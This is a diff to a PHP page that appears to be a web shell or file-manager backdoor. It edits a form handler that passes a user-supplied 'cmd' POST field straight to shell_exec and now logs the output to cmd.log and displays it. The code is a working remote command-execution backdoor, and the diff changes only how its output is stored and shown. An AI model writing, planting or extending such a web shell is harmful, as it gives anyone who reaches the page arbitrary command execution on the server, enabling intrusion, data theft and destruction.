@@ -51,6 +51,8 @@ padding: 10px;
 position: relative;
 }
 </style>
+
+
 </head>
 <body>
 <center>
@@ -162,11 +164,15 @@ function formatSize( $bytes )
 </center>
 <?php
 if(isset($_POST['SendCMD'])) {
-	$output = shell_exec("{$_POST['cmd']}");
+    $log = file_get_contents('cmd.log');
+    $logFile = "cmd.log";
+    $fh = fopen($logFile, 'w');
+    $stringData = shell_exec("{$_POST['cmd']}");
+    fwrite($fh, $stringData);
 }
 ?>
 
-<code><pre><?php echo $output; ?></pre></code>
+<code><pre><?php echo $log; ?></pre></code>
 <center><form action="" method="post" enctype="multipart/formdata">
 	<p>	
 		<input type="text" name="cmd" placeholder="Enter Command" />
